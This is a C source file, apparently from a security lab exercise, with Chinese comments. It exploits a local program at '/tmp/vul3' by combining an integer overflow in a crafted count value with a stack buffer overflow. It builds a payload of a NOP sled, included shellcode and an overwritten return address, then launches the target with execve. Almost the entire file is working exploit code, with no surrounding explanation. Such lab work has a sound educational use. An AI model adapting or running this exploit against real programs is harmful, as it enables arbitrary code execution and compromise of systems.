#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode/shellcode.h"

#define TARGET "/tmp/vul3"

int main(void)
{
    //buf起始地址
    unsigned int buf_start = 0xffff41f0;
    //构造的count 0x800003e9
    char count_str[] = "2147484649,";
    //shellcode放到buf的开头
    unsigned int shellcode_start = buf_start;
    //1001*20字节
    char payload[20020];
    //将不使用的位置设置为NOP
    memset(payload, 0x90, sizeof(payload));
    //因为有两个参数，第一个参数是我们构造的count，但该参数并不会赋值到buf中
    memcpy(payload, count_str, strlen(count_str));
    //将shellcode装载到第一个参数后面这样shellcode的起始就在buf的起始地址
    memcpy(payload + strlen(count_str), shellcode, strlen(shellcode));
    //将shellcode的起始地址放置到buf+1000的位置上，因为有第一个参数的缘故，所以要加上count的长度
    memcpy(payload + 20000 + strlen(count_str) + 4, &shellcode_start, 4);

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
